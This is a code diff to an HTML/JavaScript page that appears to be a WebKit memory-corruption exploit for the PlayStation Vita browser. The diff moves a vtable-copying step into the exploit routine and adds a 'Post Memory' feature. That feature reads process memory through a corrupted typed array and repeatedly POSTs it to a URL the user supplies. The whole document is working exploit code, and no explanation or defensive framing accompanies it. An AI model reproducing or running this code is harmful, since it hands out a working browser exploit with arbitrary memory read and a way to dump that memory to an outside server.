@@ -144,6 +144,20 @@ function tryExpl_vita(att)
 		u32base = u32[0x40000000-2];
 		logAdd("u32 address = 0x" + u32addr.toString(16));
 		logAdd("u32 base = 0x" + u32base.toString(16));
+
+	//
+	//  Copying vtable
+	//
+
+		var vtable = getU32(u32addr);
+
+		// copy vtable to writable memory (u32base)
+		for (var i = 0; i < 50; i++)
+		{
+			u32[i] = getU32(vtable+(i*4));
+		}
+
+		u32[0] = u32base+0xA0;
 	}
 	catch(e) {
 	    logAdd("Error: " + e);
@@ -174,7 +188,8 @@ function exploit()
 		
 		logAdd("<br/>========&nbsp;End &nbsp;========<br/><br/>");	
 		
-		document.getElementsByName("exec")[0].disabled = false;
+		document.getElementsByName("execBtn")[0].disabled = false;
+		document.getElementsByName("postBtn")[0].disabled = false;
 	}
 	catch(e) {
 	    logAdd(e);
@@ -187,20 +202,6 @@ function exec()
 {
 	try {   
 	    logAdd("======== Start ========");
-		
-	//
-	//  Copying vtable
-	//
-        
-		var vtable = getU32(u32addr);
-		
-		// copy vtable to writable memory (u32base)
-		for (var i = 0; i < 50; i++)
-		{
-			u32[i] = getU32(vtable+(i*4));
-		}
-		
-		u32[0] = u32base+0xA0;
 		
         // load the function address in scewebkit
         var webkit = u32[0x48/4];
@@ -319,15 +320,49 @@ function exec()
 	_log = null;
 }
 
+// "Post Memory" button onclick handler
+function post()
+{
+	try {
+		var i;
+		var buf;
+		var bufView;
+		var url;
+		var xhr;
+
+		i = u32[0x48/4] - u32base >>> 2;
+		buf = new ArrayBuffer(0xC000);
+		bufView = new Uint32Array(buf);
+		url = document.getElementsByName("postUrl")[0].value;
+		xhr = new XMLHttpRequest;
+
+		while (true) {
+			for (var j = 0; j < bufView.length; j++) {
+				bufView[j] = u32[i];
+				i++;
+			}
+
+			xhr.open("POST", url, false);
+			xhr.send(buf);
+		}
+	}
+	catch(e) {
+	    logAdd(e);
+	}
+	_log = null;
+}
+
 // print environment info
 writeEnvInfo();
 
 </script>
 
 <button style="width:100px;" onclick="exploit();">Exploit</button>
-<br>
-<button name="exec" style="width:100px;" onclick="exec();" disabled>Execute</button>
-<br>Execution may take a few minutes.</br>
+<br>URL: <input name="postUrl" type="text" size="255" />
+<br><button name="postBtn" style="width:100px;" onclick="post();" disabled>Post Memory</button>
+<br><button name="execBtn" style="width:100px;" onclick="exec();" disabled>Execute</button>
+<br>Execution may take a few minutes.
+</form>
 <br><br>
 <div id="log"></div>
 </body>
